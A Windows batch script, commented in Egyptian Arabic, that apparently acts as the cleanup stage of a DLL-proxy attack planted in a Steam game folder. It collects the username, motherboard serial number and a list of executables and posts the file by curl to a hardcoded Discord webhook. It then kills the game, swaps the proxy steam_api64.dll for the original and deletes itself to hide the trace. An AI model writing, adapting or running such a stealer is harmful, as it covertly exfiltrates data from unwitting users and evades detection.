@echo off
set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"
set "TEMP_FILE=%TEMP%\Result.txt"

:: 1. جمع البيانات (زي ما كنت عامل)
echo === Device Info === > "%TEMP_FILE%"
echo Username: %USERNAME% >> "%TEMP_FILE%"
echo Motherboard ID: >> "%TEMP_FILE%"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"
echo. >> "%TEMP_FILE%"
echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
dir /b /s *.exe >> "%TEMP_FILE%"

:: 2. إرسال الملف لـ Discord
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" %WEBHOOK_URL%

:: 3. قفل اللعبة (Kill Process)
:: هنا بنقفل أي ملف EXE شغال في نفس المجلد
for %%i in (*.exe) do (
    taskkill /F /IM "%%i" /T >nul 2>&1
)

:: 4. التنظيف (Cleaning)
:: حذف ملف النتائج
del "%TEMP_FILE%"

:: تبديل الأسماء لإرجاع الملف الأصلي
:: بنمسح ملف الـ Proxy (اللي هو شغال دلوقتي)
:: ملحوظة: الـ DLL ممكن تكون محجوزة للعبة، بس بما إننا عملنا taskkill هتبقى حرة
del /f /q "steam_api64.dll"

:: إعادة تسمية الملف الأصلي للاسم الطبيعي
ren "steam-api64.dll" "steam_api64.dll"

:: 5. مسح ملف الـ bat نفسه (الحركة الصايعة)
:: بنخليه يستنى ثانية واحدة وبعدين يمسح نفسه عشان نضمن إنه قفل
start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
exit

